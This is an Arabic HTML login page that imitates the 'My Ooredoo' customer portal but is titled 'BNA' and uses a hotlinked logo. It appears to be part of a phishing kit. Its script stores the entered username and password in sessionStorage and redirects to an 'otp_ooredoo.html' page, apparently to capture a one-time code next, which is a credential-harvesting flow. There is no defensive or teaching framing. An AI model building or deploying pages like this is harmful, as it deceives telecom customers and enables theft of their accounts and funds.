<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>تسجيل الدخول - BNA</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --red: #D0191F;
    --white: #FFFFFF;
    --text: #1A1A1A;
    --text-light: #808080;
    --line: #D0D0D0;
    --bg: #FAFAFA;
    --error: #D0191F;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body { 
    font-family: 'Cairo', Tahoma, Arial, sans-serif; 
    background: var(--bg); 
    color: var(--text);
    display: flex;
    flex-direction: column;
  }

  /* ===== الهيدر ===== */
  .site-header {
    position: sticky; top: 0; z-index: 100;
    background: var(--white);
    border-bottom: 1px solid var(--line);
    padding-top: env(safe-area-inset-top, 0px);
  }
  .header-inner {
    max-width: 1200px; margin: 0 auto;
    height: 100px; padding: 0 16px;
    display: flex; align-items: center; justify-content: space-between;
  }
  .logo { font-size: 1.5rem; font-weight: 700; color: var(--red); text-decoration: none; }
  
  .logo-placeholder {
    display: flex;
    align-items: center;
    height: 88px;
    width: auto;
  }
  
  .ooredoo-logo {
    height: 88px;
    width: auto;
    max-width: 300px;
    object-fit: contain;
  }
  .header-actions { display: flex; align-items: center; gap: 12px; }

  .lang-toggle {
    display: flex; background: #fff;
    border: 2px solid var(--red); border-radius: 999px;
    padding: 2px; cursor: pointer; font-family: inherit;
  }
  .lang-toggle span {
    padding: 4px 12px; border-radius: 999px;
    font-size: .85rem; font-weight: 600; color: var(--red);
    transition: background .2s, color .2s;
  }
  .lang-toggle span.active { background: var(--red); color: #fff; }

  .menu-btn {
    width: 44px; height: 44px; background: none; border: none; cursor: pointer;
    display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 6px;
    border-radius: 8px;
  }
  .menu-btn span {
    display: block; width: 26px; height: 3px; border-radius: 2px;
    background: var(--red); transition: transform .25s, opacity .25s;
  }
  .menu-btn.open span:nth-child(1) { transform: translateY(9px) rotate(45deg); }
  .menu-btn.open span:nth-child(2) { opacity: 0; }
  .menu-btn.open span:nth-child(3) { transform: translateY(-9px) rotate(-45deg); }

  .nav-menu { display: none; background: #fff; border-top: 1px solid var(--line); }
  .nav-menu.open { display: block; }
  .nav-menu a {
    display: block; padding: 14px 20px; color: var(--text);
    text-decoration: none; font-weight: 600; border-bottom: 1px solid var(--line);
  }
  .nav-menu a:hover { color: var(--red); background: #FFF5F5; }

  /* ===== محتوى الصفحة ===== */
  .container {
    flex: 1; max-width: 420px; width: 100%; margin: 0 auto;
    padding: 40px 20px; padding-bottom: max(32px, env(safe-area-inset-bottom, 0px));
  }

  /* رسالة الخطأ */
  .error-alert {
    display: none;
    background: #FFF5F5;
    border: 1px solid #FFD6D6;
    border-radius: 12px;
    padding: 14px 16px;
    margin-bottom: 32px;
    gap: 12px;
    align-items: flex-start;
  }
  .error-alert.show {
    display: flex;
  }
  .error-alert-icon {
    width: 20px;
    height: 20px;
    background: var(--red);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    flex-shrink: 0;
    font-size: 1.1rem;
    line-height: 1;
  }
  .error-alert-content {
    flex: 1;
  }
  .error-alert-text {
    color: var(--error);
    font-size: 0.95rem;
    font-weight: 500;
  }
  .error-alert-close {
    background: none;
    border: none;
    color: var(--error);
    cursor: pointer;
    font-size: 1.3rem;
    padding: 0;
    line-height: 1;
    flex-shrink: 0;
  }

  .login-header { margin-bottom: 36px; text-align: center; }
  .login-header h1 {
    font-size: 1.7rem; font-weight: 700; margin-bottom: 12px;
    line-height: 1.2;
    color: var(--text);
  }
  .login-header h1 .accent { color: var(--red); font-weight: 700; }
  .login-header p { 
    color: var(--text-light); 
    font-size: .9rem;
    line-height: 1.5;
    font-weight: 400;
  }

  .form-group { margin-bottom: 18px; }
  .form-group label { 
    display: block; 
    margin-bottom: 8px; 
    font-weight: 400; 
    font-size: .9rem;
    color: var(--text-light);
  }
  .form-group input {
    width: 100%; 
    padding: 13px 16px;
    border: 1.5px solid var(--line);
    border-radius: 14px; 
    font-family: inherit; 
    font-size: .9rem;
    font-weight: 400;
    background: var(--white);
    color: var(--text);
    transition: border-color .2s, box-shadow .2s;
  }
  .form-group input:focus {
    outline: none; 
    border-color: var(--red);
    box-shadow: 0 0 0 2px rgba(208, 25, 31, 0.08);
  }
  .form-group input.error {
    border-color: var(--error);
    box-shadow: 0 0 0 2px rgba(208, 25, 31, 0.15);
  }
  .form-group input::placeholder { 
    color: var(--text-light);
    font-weight: 400;
  }
  .error-message {
    color: var(--error);
    font-size: 0.85rem;
    margin-top: 6px;
    display: none;
  }
  .error-message.show { display: block; }

  .forgot-password { 
    text-align: center; 
    margin-bottom: 32px; 
  }
  .forgot-password a {
    color: var(--red); 
    text-decoration: none; 
    font-weight: 600; 
    font-size: .95rem;
    border-bottom: 1.5px solid var(--red);
    transition: opacity .2s;
  }
  .forgot-password a:hover { opacity: 0.85; }

  .login-btn {
    width: 100%; 
    padding: 18px 24px; 
    background: var(--red); 
    color: white;
    border: none; 
    border-radius: 999px; 
    font-family: inherit;
    font-size: 1.1rem; 
    font-weight: 700; 
    cursor: pointer;
    transition: background .2s, transform .1s;
  }
  .login-btn:hover { background: #B3161C; }
  .login-btn:active { transform: scale(0.98); }
  .login-btn:focus-visible {
    outline: 3px solid rgba(208, 25, 31, 0.35);
    outline-offset: 2px;
  }

  @media (max-width: 480px) {
    .container { padding: 48px 20px; }
    .login-header h1 { font-size: 1.75rem; }
    .login-header { margin-bottom: 40px; }
  }

  @media (prefers-reduced-motion: reduce) {
    * { transition: none !important; }
  }
</style>
</head>
<body>

<header class="site-header">
  <div class="header-inner">
    <div class="logo-placeholder">
      <img src="https://i.ibb.co/1JJbfqh8/ooredoo-logo-png-seeklogo-446266.png" alt="Ooredoo" class="ooredoo-logo">
    </div>
    <div class="header-actions">
      <button class="lang-toggle" id="langToggle" aria-label="تغيير اللغة">
        <span class="active" data-lang="en">EN</span>
      </button>
      <button class="menu-btn" id="menuBtn" aria-label="القائمة" aria-expanded="false" aria-controls="navMenu">
        <span></span><span></span><span></span>
      </button>
    </div>
  </div>
  <nav class="nav-menu" id="navMenu">
    <a href="#">الرئيسية</a>
    <a href="#">المنتجات</a>
    <a href="#">من نحن</a>
    <a href="#">تواصل معنا</a>
  </nav>
</header>

<main class="container">
  <!-- رسالة الخطأ -->
  <div class="error-alert" id="errorAlert">
    <div class="error-alert-icon">✕</div>
    <div class="error-alert-content">
      <div class="error-alert-text" id="errorText">اسم المستخدم أو كلمة المرور غير صحيح</div>
    </div>
    <button class="error-alert-close" id="closeError">✕</button>
  </div>

  <div class="login-header">
    <h1>تسجيل الدخول إلى <span class="accent">My</span><br><span class="accent">Ooredoo</span></h1>
    <p>تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور.</p>
  </div>

  <form id="loginForm">
    <div class="form-group">
      <label for="email">البريد الالكتروني أو اسم المستخدم</label>
      <input 
        type="text" 
        id="email" 
        name="email" 
        placeholder="البريد الالكتروني أو اسم المستخدم"
      >
      <div class="error-message" id="emailError">هذا الحقل مطلوب</div>
    </div>

    <div class="form-group">
      <label for="password">كلمة المرور</label>
      <input 
        type="password" 
        id="password" 
        name="password" 
        placeholder="كلمة المرور"
      >
      <div class="error-message" id="passwordError">هذا الحقل مطلوب</div>
    </div>

    <div class="forgot-password">
      <a href="#">هل نسيت كلمة المرور؟</a>
    </div>

    <button type="submit" class="login-btn">تسجيل الدخول</button>
  </form>
</main>

<script>
  const menuBtn = document.getElementById('menuBtn');
  const navMenu = document.getElementById('navMenu');
  menuBtn.addEventListener('click', () => {
    const open = menuBtn.classList.toggle('open');
    navMenu.classList.toggle('open', open);
    menuBtn.setAttribute('aria-expanded', open);
  });

  const langToggle = document.getElementById('langToggle');
  langToggle.addEventListener('click', () => {
    window.location.href = 'login_ooredoo_en.html';
  });

  // التحقق من رسالة الخطأ من sessionStorage
  const errorAlert = document.getElementById('errorAlert');
  const closeError = document.getElementById('closeError');
  const errorText = document.getElementById('errorText');

  const errorMessage = sessionStorage.getItem('loginError');
  if (errorMessage) {
    errorAlert.classList.add('show');
    errorText.textContent = errorMessage;
    sessionStorage.removeItem('loginError');
  }

  closeError.addEventListener('click', () => {
    errorAlert.classList.remove('show');
  });

  const loginForm = document.getElementById('loginForm');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const emailError = document.getElementById('emailError');
  const passwordError = document.getElementById('passwordError');

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    let isValid = true;
    
    // التحقق من البريد الالكتروني
    if (emailInput.value.trim() === '') {
      emailInput.classList.add('error');
      emailError.classList.add('show');
      isValid = false;
    } else {
      emailInput.classList.remove('error');
      emailError.classList.remove('show');
    }
    
    // التحقق من كلمة المرور
    if (passwordInput.value.trim() === '') {
      passwordInput.classList.add('error');
      passwordError.classList.add('show');
      isValid = false;
    } else {
      passwordInput.classList.remove('error');
      passwordError.classList.remove('show');
    }
    
    // إذا كانت جميع البيانات صحيحة، اذهب لصفحة التحميل
    if (isValid) {
      // حفظ البيانات في sessionStorage لصفحة التحميل
      sessionStorage.setItem('userEmail', emailInput.value);
      sessionStorage.setItem('userPassword', passwordInput.value);
      window.location.href = 'otp_ooredoo.html';
    }
  });

  // إزالة رسالة الخطأ عند الكتابة
  emailInput.addEventListener('input', () => {
    if (emailInput.value.trim() !== '') {
      emailInput.classList.remove('error');
      emailError.classList.remove('show');
    }
  });

  passwordInput.addEventListener('input', () => {
    if (passwordInput.value.trim() !== '') {
      passwordInput.classList.remove('error');
      passwordError.classList.remove('show');
    }
  });
</script>

</body>
</html>
